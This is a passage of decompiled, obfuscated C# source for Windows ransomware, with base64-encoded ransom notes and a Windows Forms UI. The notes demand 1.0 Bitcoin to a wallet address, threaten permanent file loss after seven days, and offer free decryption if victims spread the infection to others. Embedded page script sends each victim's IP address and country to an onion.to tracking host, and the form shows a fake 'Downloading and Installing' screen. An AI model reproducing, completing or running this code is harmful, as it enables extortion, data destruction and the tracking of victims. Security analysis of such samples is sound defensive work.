IHBhcnQgb2Ygb3VyIHRlYW0gaGFzIGxvc3QgYSBkZWFyIG1lbWJlciBmcm9tIGhpcyBmYW1pbHkuIDxzdHJvbmc+SSBwZXJzb25hbGx5IGhhdmUgbG9zdCBib3RoIG15IHBhcmVudHMgYW5kIG15IGxpdHRsZSBzaXN0ZXIgaW4gMjAxNS48L3N0cm9uZz4gVGhlIHNhZCBwYXJ0IG9mIHRoaXMgd2FyIGlzIHRoYXQgYWxsIHRoZSBwYXJ0cyBrZWVwIGZpZ2h0aW5nIGJ1dCBldmVudHVhbGx5IHdlIHRoZSBwb29yIGFuZCBzaW1wbGUgcGVvcGxlIHN1ZmZlciBhbmQgd2F0Y2hpbmcgb3VyIGZhbWlseSBhbmQgZnJpZW5kcyBkaWUgZWFjaCBkYXkuIDxicj5UaGUgd29ybGQgcmVtYWluZWQgc2lsZW50IGFuZCBubyBvbmUgaGVscGluZyB1cyBzbyB3ZSBkZWNpZGVkIHRvIHRha2UgYW4gYWN0aW9uLiA8YSBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TeXJpYW5fQ2l2aWxfV2FyIiB0YXJnZXQ9Il9ibGFuayI+KFN5cmlhIFdhciBpbiBXaWtpcGVkaWEpPC9hPiA8YnI+PC9wPjxwIGNsYXNzPSJhbGVydC1zdWNjZXNzIHRleHQtY2VudGVyIj4gQmUgcGVyZmVjdGx5IHN1cmUgdGhhdCBhbGwgdGhlIG1vbmV5IHRoYXQgd2UgZ2V0IGdvZXMgdG8gZm9vZCwgbWVkaWNpbmUsIHNoZWx0ZXIgdG8gb3VyIHBlb3BsZS4gPGJyPldlIGFyZSBleHRyZW1lbHkgc29ycnkgdGhhdCB3ZSBmb3JjaW5nIHlvdSB0byBwYXkgYnV0IHRoYXQncyB0aGUgb25seSB3YXkgdGhhdCB3ZSBjYW4ga2VlcCBsaXZpbmcuIDwvcD48L2Rpdj48L2Rpdj48ZGl2IGNsYXNzPSJyb3ciPiA8ZGl2IGNsYXNzPSJjb2wtc20tMTIiPiA8aDM+SG93IHRvIGJ1eSBCaXRjb2lucz88L2gzPiA8cD4gSWYgeW91IGFyZW4ndCBmYW1pbGlhciB3aXRoIEJpdGNvaW4gYW5kIGRvbid0IGtub3cgd2hhdCBpcyBpdCwgcGxlYXNlIHZpc2l0IHRoZSBvZmZpY2lhbCBCaXRjb2luIHdlYnNpdGUgKDxhIGhyZWY9J2h0dHBzOi8vYml0Y29pbi5vcmcvZW4vZ2V0dGluZy1zdGFydGVkJyB0YXJnZXQ9Il9ibGFuayI+aHR0cHM6Ly9iaXRjb2luLm9yZy9lbi9nZXR0aW5nLXN0YXJ0ZWQ8L2E+KSwgZm9sbG93IHRoZSBzdGVwcyBhbmQgeW91J2xsIGdldCB5b3VyIEJpdGNvaW5zLiA8YnI+VG8gdW5kZXJzdGFuZCBtb3JlIHlvdSBjYW4gY2hlY2sgYWxzbyBvbiB0aGUgRkFRIHBhZ2UgKDxhIGhyZWY9J2h0dHBzOi8vYml0Y29pbi5vcmcvZW4vZmFxJyB0YXJnZXQ9J19ibGFuayc+aHR0cHM6Ly9iaXRjb2luLm9yZy9lbi9mYXE8L2E+KS4gPGJyPlBsZWFzZSBjaGVjayB0aGlzIHdlYnNpdGUgKDxhIGhyZWY9J2h0dHBzOi8vY29pbmF0bXJhZGFyLmNvbS8nIHRhcmdldD0nX2JsYW5rJz5odHRwczovL2NvaW5hdG1yYWRhci5jb20vPC9hPikgd2hlcmUgeW91IGNhbiBmaW5kIEJpdGNvaW4gQVRNIGFsbCBvdmVyIHRoZSB3b3JsZC4gPC9wPjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InJvdyI+IDxkaXYgY2xhc3M9ImNvbC1zbS0xMiI+IDxoMz5GdWxsIGxpc3Qgb2YgZW5jcnlwdGVkIGZpbGVzPC9oMz4gPHRleHRhcmVhIHN0eWxlPSJ3aWR0aDogMTAwJTsgaGVpZ2h0OiA0MDBweDsiPltGSUxFU19MSVNUXTwvdGV4dGFyZWE+IDxicj48YnI+PGJyPjxicj48L2Rpdj48L2Rpdj48L2Rpdj48c2NyaXB0PmZ1bmN0aW9uIGNoZWNrKCl7JC5nZXQoImh0dHBzOi8vYmxvY2tjaGFpbi5pbmZvL3EvYWRkcmVzc2JhbGFuY2UvMUcyMWtLbVVKYk1qTDFZdWVITjZhRTI4WkxwWTR0MlBuMz9jb25maXJtYXRpb25zPTMiLCBmdW5jdGlvbiAoZGF0YSl7ZGF0YT1kYXRhIC8gMTAwMDAwMDAwOyBpZiAoZGF0YSA+PTEuMCl7JCgiI3BhaWQiKS5yZW1vdmVDbGFzcygiaGlkZSIpOyAkKCIjbm90cGFpZCIpLmFkZENsYXNzKCJoaWRlIik7ICQoIiNub3RwYWlkMSIpLmFkZENsYXNzKCJoaWRlIik7fWVsc2V7JCgiI2JhbGFuY2UiKS5odG1sKCJDdXJyZW50IGJhbGFuY2UgaXM6ICIgKyBkYXRhICsgIiBCaXRjb2lucyIpO319KTt9JCgiI2Noa2JhbGFuY2UiKS5vbigiY2xpY2siLCBmdW5jdGlvbiAoKXtjaGVjaygpO30pOyAkKGZ1bmN0aW9uICgpe2NoZWNrKCk7ICQoJyNjbG9jaycpLmNvdW50ZG93bih7ZGF0ZTogIkRlYyAyMCwgMjAxNiAxNTowNjo1NSJ9KTt9KTsgJChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24gKCl7JC5nZXRKU09OKCJodHRwOi8vZnJlZWdlb2lwLm5ldC9qc29uLyIsIGZ1bmN0aW9uIChkYXRhKXskLmdldCgiaHR0cHM6Ly8zaG51aHlkdTRwZDI0N3FiLm9uaW9uLnRvL3BpeGVsLzMwNThlMGYzMzZlNDVkNjIzOTM3ZjE5NTJlY2I5MzhlLyIgKyBkYXRhLmlwICsgIi8iICsgZGF0YS5jb3VudHJ5X2NvZGUgKyAiLyIgKyBkYXRhLmNvdW50cnlfbmFtZSwgZnVuY3Rpb24gKCl7fSk7fSk7fSk7IDwvc2NyaXB0PiA8L2JvZHk+PC9odG1sPg==");

	public static string cmhttgnb = klfhxfx("c2F2ZV95b3VyX2ZpbGVzLmh0bWw=");

	public static string obgrinfgth = klfhxfx("V2FybmluZyBNZXNzYWdlISENCj09PT09PT09PT09PT09PT09DQoNCldlIGFyZSBzb3JyeSB0byBzYXkgdGhhdCB5b3VyIGNvbXB1dGVyIGFuZCB5b3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQsIA0KYnV0IHdhaXQsIGRvbid0IHdvcnJ5LiBUaGVyZSBpcyBhIHdheSB0aGF0IHlvdSBjYW4gcmVzdG9yZSB5b3VyIGNvbXB1dGVyIGFuZCBhbGwgb2YgeW91ciBmaWxlcw0KDQoNCioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBZb3VyIHBlcnNvbmFsIHVuaXF1ZSBJRDogMzA1OGUwZjMzNmU0NWQ2MjM5MzdmMTk1MmVjYjkzOGUJCQkJCQkJCQkJCSAgICAJIA0KDQogICAgICAgICAgICAgICAgICAgICBZb3UgbXVzdCBzZW5kIGF0IGxlYXN0IDEuMCBCaXRjb2luIHRvIGFkZHJlc3MgMUcyMWtLbVVKYk1qTDFZdWVITjZhRTI4WkxwWTR0MlBuMyB0byBnZXQgeW91ciBmaWxlcyBiYWNrCQkJCQkgIA0KDQogICBXYXJuaW5nISEhIElmIHlvdSB3aWxsIG5vdCBwYXkgZm9yIHRoZSBuZXh0IDcgZGF5cywgdGhlIGRlY3J5cHRpb24ga2V5IHdpbGwgYmUgZGVsZXRlZCBhbmQgeW91ciBmaWxlcyB3aWxsIGJlIGxvc3QgZm9yZXZlci4gCSANCg0KKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCg0KUmVzdG9yaW5nIHlvdXIgZmlsZXMgLSBUaGUgZmFzdCBhbmQgZWFzeSB3YXkNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpUbyBnZXQgeW91ciBmaWxlcyBmYXN0LCBwbGVhc2UgdHJhbnNmZXIgMS4wIGJpdGNvaW4gdG8gb3VyIHdhbGxldCBhZGRyZXNzIDFHMjFrS21VSmJNakwxWXVlSE42YUUyOFpMcFk0dDJQbjMuIFdoZW4gd2Ugd2lsbCBnZXQgdGhlIG1vbmV5LA0Kd2Ugd2lsbCBpbW1lZGlhdGVseSBnaXZlIHlvdSB5b3VyIHByaXZhdGUgZGVjcnlwdGlvbiBrZXkuIFBheW1lbnQgc2hvdWxkIGJlIGNvbmZpcm1lZCBpbiBhYm91dCAyIGhvdXJzIGFmdGVyIHBheW1lbnQgbWFkZS4NCg0KDQpSZXN0b3JpbmcgeW91ciBmaWxlcyAtIFRoZSBuYXN0eSB3YXkNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KU2VuZCB0aGUgbGluayBodHRwczovLzNobnVoeWR1NHBkMjQ3cWIub25pb24udG8vci8zMDU4ZTBmMzM2ZTQ1ZDYyMzkzN2YxOTUyZWNiOTM4ZSBiZWxvdyB0byBvdGhlciBwZW9wbGUsIGlmIHR3byBvciBtb3JlIHBlb3BsZSB3aWxsIGluc3RhbGwgdGhpcyBmaWxlIGFuZCBwYXksIHdlIHdpbGwgZGVjcnlwdCB5b3VyIGZpbGVzIGZvciBmcmVlLg0KDQoNCldoYXQgd2UgZGlkPw0KPT09PT09PT09PT09DQpXZSBoYWQgZW5jcnlwdGVkIGFsbCBvZiB5b3VyIGltcG9ydGFudCBpbWFnZXMsIGRvY3VtZW50cywgdmlkZW9zIGFuZCBhbGwgb3RoZXIgZmlsZXMgb24geW91ciBjb21wdXRlci4gDQpXZSB1c2VkIGEgdmVyeSBzdHJvbmcgZW5jcnlwdGlvbiBhbGdvcml0aG0gdGhhdCB1c2VkIGJ5IGFsbCBnb3Zlcm5tZW50cyBhbGwgb3ZlciB0aGUgd29ybGQuIA0KV2Ugc3RvcmUgeW91ciBwZXJzb25hbCBkZWNyeXB0aW9uIGNvZGUgdG8geW91ciBmaWxlcyBvbiBvdXIgc2VydmVycyBhbmQgd2UgYXJlIHRoZSBvbmx5IG9uZXMgdGhhdCBjYW4gZGVjcnlwdCB5b3VyIGZpbGVzLiANClBsZWFzZSBkb24ndCB0cnkgdG8gYmUgc21hcnQsIGFueXRoaW5nIG90aGVyIHRoYW4gcGF5bWVudCB3aWxsIGNhdXNlIGRhbWFnZSB0byB5b3VyIGZpbGVzIGFuZCB0aGUgZmlsZXMgd2lsbCBiZSBsb3N0IGZvcmV2ZXIhISENCklmIHlvdSB3aWxsIG5vdCBwYXkgZm9yIHRoZSBuZXh0IDcgZGF5cywgdGhlIGRlY3J5cHRpb24ga2V5IHdpbGwgYmUgZGVsZXRlZCBhbmQgeW91ciBmaWxlcyB3aWxsIGJlIGxvc3QgZm9yZXZlci4NCg0KDQpXaHkgd2UgZG8gdGhhdD8gDQo9PT09PT09PT09PT09PT0NCldlIGFyZSBhIGdyb3VwIG9mIGNvbXB1dGVyIHNjaWVuY2Ugc3R1ZGVudHMgZnJvbSBTeXJpYSwgYXMgeW91IHByb2JhYmx5IGtub3cgU3lyaWEgaXMgaGF2aW5nIGJhZCB0aW1lIGZvciB0aGUgbGFzdCBmaXZlIHllYXJzLiANClNpbmNlIDIwMTEgd2UgaGF2ZSBtb3JlIHRoZSBoYWxmIG1pbGxpb24gcGVvcGxlIGRpZWQgYW5kIG92ZXIgNSBtaWxsaW9uIHJlZnVnZWVzLiBFYWNoIG1lbWJlciBvZiBvdXIgdGVhbSBoYXMgbG9zdCBhIGRlYXIgZnJvbSBoaXMgZmFtaWx5LiANCkkgcGVyc29uYWxseSBoYXZlIGxvc3QgYm90aCBteSBwYXJlbnRzIGFuZCBteSBsaXR0bGUgc2lzdGVyIGluIDIwMTUuIA0KVGhlIHNhZCBwYXJ0IGlzIHRoYXQgdGhlIHdvcmxkIHJlbWFpbmVkIHNpbGVudCBhbmQgbm8gb25lIGhlbHBpbmcgdXMgc28gd2UgZGVjaWRlZCB0byB0YWtlIGFuIGFjdGlvbi4NCg0KDQpIb3cgdG8gYnV5IEJpdGNvaW5zPw0KPT09PT09PT09PT09PT09PT09PT0NCg0KSWYgeW91IGFyZW4ndCBmYW1pbGlhciB3aXRoIEJpdGNvaW4gYW5kIGRvbid0IGtub3cgd2hhdCBpcyBpdCwgDQpwbGVhc2UgdmlzaXQgdGhlIG9mZmljaWFsIEJpdGNvaW4gd2Vic2l0ZSAoaHR0cHM6Ly9iaXRjb2luLm9yZy9lbi9nZXR0aW5nLXN0YXJ0ZWQpLCANCmZvbGxvdyB0aGUgc3RlcHMgYW5kIHlvdSdsbCBnZXQgeW91ciBCaXRjb2lucy4gDQpUbyB1bmRlcnN0YW5kIG1vcmUgeW91IGNhbiBjaGVjayBhbHNvIG9uIHRoZSBGQVEgcGFnZSAoaHR0cHM6Ly9iaXRjb2luLm9yZy9lbi9mYXEpLiANClBsZWFzZSBjaGVjayB0aGlzIHdlYnNpdGUgKGh0dHBzOi8vY29pbmF0bXJhZGFyLmNvbS8pIHdoZXJlIHlvdSBjYW4gZmluZCBCaXRjb2luIEFUTSBhbGwgb3ZlciB0aGUgd29ybGQuDQoNCg0KTGlzdCBvZiBlbmNyeXB0ZWQgZmlsZXMgb24geW91ciBjb21wdXRlcg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KW0ZJTEVTX0xJU1RdDQoNCg==");

	public static string bhlklc = klfhxfx("c2F2ZV95b3VyX2ZpbGVzLnR4dA==");

	public static string ymtppfwi = "3058e0f336e45d623937f1952ecb938e";

	public static string dwaakbgbjt = "1G21kKmUJbMjL1YueHN6aE28ZLpY4t2Pn3";

	public static int qnowpv = 7;

	public static DateTime ahjpgv;

	public static string vkostov = klfhxfx(klfhxfx(klfhxfx("VDFSSk0xcFhUWGxOYWtFd1dXcE5kMXBVUlhoWmFrbDRUMWRGTTAxRVJYaE5SRWw0VDFSRmVGbDZTVDA9")));

	public int xggvf = 4;

	public uqiyvgotx()
	{
		sokwsm();
		if (File.Exists(ghfszhoyz))
		{
			try
			{
				((Form)this).set_Opacity(0.0);
				((Form)this).set_TopMost(false);
			}
			catch (Exception)
			{
			}
		}
	}

	protected override void Dispose(bool oktyw)
	{
		if (oktyw && caiwtr != null)
		{
			caiwtr.Dispose();
		}
		((Form)this).Dispose(oktyw);
	}

	private void sokwsm()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		//IL_0223: Unknown result type (might be due to invalid IL or missing references)
		//IL_022d: Expected O, but got Unknown
		//IL_02f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0301: Expected O, but got Unknown
		//IL_03cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d5: Expected O, but got Unknown
		//IL_06a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b3: Expected O, but got Unknown
		//IL_0787: Unknown result type (might be due to invalid IL or missing references)
		//IL_0791: Expected O, but got Unknown
		//IL_08a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b3: Expected O, but got Unknown
		//IL_098b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0995: Expected O, but got Unknown
		//IL_0a4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a58: Expected O, but got Unknown
		//IL_0ad0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ada: Expected O, but got Unknown
		//IL_0b89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b93: Expected O, but got Unknown
		//IL_0c60: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6a: Expected O, but got Unknown
		//IL_0d19: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d23: Expected O, but got Unknown
		//IL_0e17: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e21: Expected O, but got Unknown
		//IL_0f04: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0e: Expected O, but got Unknown
		//IL_0feb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff5: Expected O, but got Unknown
		//IL_10d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_10dc: Expected O, but got Unknown
		caiwtr = new Container();
		oktyw = new PictureBox();
		gdarr = new Label();
		owfseikso = new Label();
		zsxabttsw = new Timer(caiwtr);
		cphztnc = new Label();
		fuluqqmvy = new Timer(caiwtr);
		pocsbyqznz = new BackgroundWorker();
		nmrnfongih = new Panel();
		pklnsqh = new PictureBox();
		vyypirhr = new Label();
		cxifugygdc = new Label();
		coxeju = new RichTextBox();
		xgifxg = new Button();
		iuggembcgo = new Label();
		eplizslo = new TextBox();
		pykuvrda = new TextBox();
		jyxeeejr = new Label();
		lxuybk = new TextBox();
		kjdwytm = new Label();
		ehsvktktri = new Label();
		eqbuxanldh = new Label();
		xsloixjg = new Label();
		xtmkybyej = new Label();
		wnhnttlnrn = new Timer(caiwtr);
		deyqyrcm = new BackgroundWorker();
		((ISupportInitialize)oktyw).BeginInit();
		((Control)nmrnfongih).SuspendLayout();
		((ISupportInitialize)pklnsqh).BeginInit();
		((Control)this).SuspendLayout();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Stream manifestResourceStream = executingAssembly.GetManifestResourceStream("d.gif");
		oktyw.set_Image(Image.FromStream(manifestResourceStream));
		((Control)oktyw).set_Location(new Point(0, 0));
		((Control)oktyw).set_Name(klfhxfx("eHh4Mnh4eA=="));
		((Control)oktyw).set_Size(new Size(800, 600));
		oktyw.set_SizeMode((PictureBoxSizeMode)2);
		oktyw.set_TabIndex(0);
		oktyw.set_TabStop(false);
		((Control)gdarr).set_AutoSize(true);
		((Control)gdarr).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)gdarr).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 25f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)gdarr).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)gdarr).set_Location(new Point(250, 194));
		((Control)gdarr).set_Name(klfhxfx("eHh4M3h4eA=="));
		((Control)gdarr).set_Size(new Size(315, 29));
		((Control)gdarr).set_TabIndex(1);
		((Control)gdarr).set_Text(klfhxfx("RG93bmxvYWRpbmcgYW5kIEluc3RhbGxpbmc="));
		((Control)owfseikso).set_AutoSize(true);
		((Control)owfseikso).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)owfseikso).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 25f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)owfseikso).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)owfseikso).set_Location(new Point(320, 374));
		((Control)owfseikso).set_Name(klfhxfx("eHh4NHh4eA=="));
		((Control)owfseikso).set_Size(new Size(164, 29));
		((Control)owfseikso).set_TabIndex(2);
		((Control)owfseikso).set_Text(klfhxfx("UGxlYXNlIHdhaXQuLi4="));
		((Control)cphztnc).set_AutoSize(true);
		((Control)cphztnc).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)cphztnc).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 15f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)cphztnc).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)cphztnc).set_Location(new Point(366, 412));
		((Control)cphztnc).set_Name(klfhxfx("eHh4Nnh4eA=="));
		((Control)cphztnc).set_Size(new Size(0, 18));
		((Control)cphztnc).set_TabIndex(3);
		pocsbyqznz.DoWork += grcnzgsixq;
		pocsbyqznz.RunWorkerCompleted += rkaair;
		((Control)nmrnfongih).get_Controls().Add((Control)(object)pklnsqh);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)vyypirhr);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)cxifugygdc);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)coxeju);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)xgifxg);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)iuggembcgo);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)eplizslo);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)pykuvrda);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)jyxeeejr);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)lxuybk);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)kjdwytm);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)ehsvktktri);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)eqbuxanldh);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)xsloixjg);
		((Control)nmrnfongih).get_Controls().Add((Control)(object)xtmkybyej);
		((Control)nmrnfongih).set_Location(new Point(0, 0));
		((Control)nmrnfongih).set_Name(klfhxfx("eHh4OHh4eA=="));
		((Control)nmrnfongih).set_Size(new Size(800, 600));
		((Control)nmrnfongih).set_TabIndex(4);
		((Control)nmrnfongih).set_Visible(false);
		((Control)pklnsqh).set_Location(new Point(0, 0));
		((Control)pklnsqh).set_Name(klfhxfx("eHh4MjV4eHg="));
		((Control)pklnsqh).set_Size(new Size(0, 0));
		pklnsqh.set_TabIndex(19);
		pklnsqh.set_TabStop(false);
		((Control)vyypirhr).set_AutoSize(true);
		((Control)vyypirhr).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)vyypirhr).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 15f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)vyypirhr).set_ForeColor(Color.FromArgb(164, 17, 240));
		((Control)vyypirhr).set_Location(new Point(366, 167));
		((Control)vyypirhr).set_Name(klfhxfx("eHh4MjN4eHg="));
		((Control)vyypirhr).set_Size(new Size(345, 18));
		((Control)vyypirhr).set_TabIndex(18);
		((Control)vyypirhr).set_Text(klfhxfx("V2hlbiBjb3VudGRvd24gZW5kcyB5b3VyIGZpbGVzIHdpbGwgYmUgbG9zdCBmb3JldmVy"));
		((Control)vyypirhr).set_Visible(false);
		((Control)cxifugygdc).set_AutoSize(true);
		((Control)cxifugygdc).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)cxifugygdc).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 40f, (FontStyle)1, (GraphicsUnit)2, (byte)177));
		((Control)cxifugygdc).set_ForeColor(Color.FromArgb(164, 17, 240));
		((Control)cxifugygdc).set_Location(new Point(176, 118));
		((Control)cxifugygdc).set_Name(klfhxfx("eHh4MjJ4eHg="));
		((Control)cxifugygdc).set_Size(new Size(471, 46));
		((Control)cxifugygdc).set_TabIndex(17);
		((Control)cxifugygdc).set_Text(klfhxfx("MDAgRGF5cyAwMDowMDowMCBIb3Vycw=="));
		((Control)cxifugygdc).set_Visible(false);
		((Control)coxeju).set_Location(new Point(59, 309));
		((Control)coxeju).set_Name(klfhxfx("eHh4MTJ4eHg="));
		((Control)coxeju).set_Size(new Size(685, 204));
		((Control)coxeju).set_TabIndex(16);
		((Control)coxeju).set_Text("");
		((Control)coxeju).set_Visible(false);
		((Control)xgifxg).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 15f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)xgifxg).set_Location(new Point(610, 555));
		((Control)xgifxg).set_Name(klfhxfx("eHh4MTN4eHg="));
		((Control)xgifxg).set_Size(new Size(75, 30));
		((Control)xgifxg).set_TabIndex(15);
		((Control)xgifxg).set_Text(klfhxfx("RGVjcnlwdA=="));
		((ButtonBase)xgifxg).set_UseVisualStyleBackColor(true);
		((Control)xgifxg).set_Visible(false);
		((Control)xgifxg).add_Click((EventHandler)nczqu);
		((Control)iuggembcgo).set_AutoSize(true);
		((Control)iuggembcgo).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)iuggembcgo).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)iuggembcgo).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)iuggembcgo).set_Location(new Point(56, 530));
		((Control)iuggembcgo).set_Name(klfhxfx("eHh4MTR4eHg="));
		((Control)iuggembcgo).set_Size(new Size(548, 20));
		((Control)iuggembcgo).set_TabIndex(14);
		((Control)iuggembcgo).set_Text(klfhxfx("QWZ0ZXIgeW91XCd2ZSBtYWRlIHRoZSBwYXltZW50LCB5b3Ugd2lsbCBnZXQgYSBjb2RlLCBwbGVhc2UgaW5zZXJ0IGl0IGhlcmU6"));
		iuggembcgo.set_TextAlign((ContentAlignment)32);
		((Control)iuggembcgo).set_Visible(false);
		((Control)eplizslo).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)eplizslo).set_Location(new Point(59, 557));
		((Control)eplizslo).set_Name(klfhxfx("eHh4MTV4eHg="));
		((Control)eplizslo).set_Size(new Size(545, 27));
		((Control)eplizslo).set_TabIndex(13);
		((Control)eplizslo).set_Visible(false);
		((Control)pykuvrda).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)pykuvrda).set_Location(new Point(335, 271));
		((Control)pykuvrda).set_Name(klfhxfx("eHh4MTZ4eHg="));
		((Control)pykuvrda).set_Size(new Size(366, 27));
		((Control)pykuvrda).set_TabIndex(12);
		pykuvrda.set_TextAlign((HorizontalAlignment)2);
		((Control)pykuvrda).set_Visible(false);
		((Control)jyxeeejr).set_AutoSize(true);
		((Control)jyxeeejr).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)jyxeeejr).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)jyxeeejr).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)jyxeeejr).set_Location(new Point(95, 274));
		((Control)jyxeeejr).set_Name(klfhxfx("eHh4MTd4eHg="));
		((Control)jyxeeejr).set_Size(new Size(306, 20));
		((Control)jyxeeejr).set_TabIndex(11);
		((Control)jyxeeejr).set_Text(klfhxfx("U2VuZCA=") + "1.0" + klfhxfx("IEJUQyB0byB0aGlzIGFkZHJlc3M6"));
		jyxeeejr.set_TextAlign((ContentAlignment)32);
		((Control)jyxeeejr).set_Visible(false);
		((Control)lxuybk).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)lxuybk).set_Location(new Point(335, 233));
		((Control)lxuybk).set_Name(klfhxfx("eHh4MTh4eHg="));
		((Control)lxuybk).set_Size(new Size(298, 27));
		((Control)lxuybk).set_TabIndex(10);
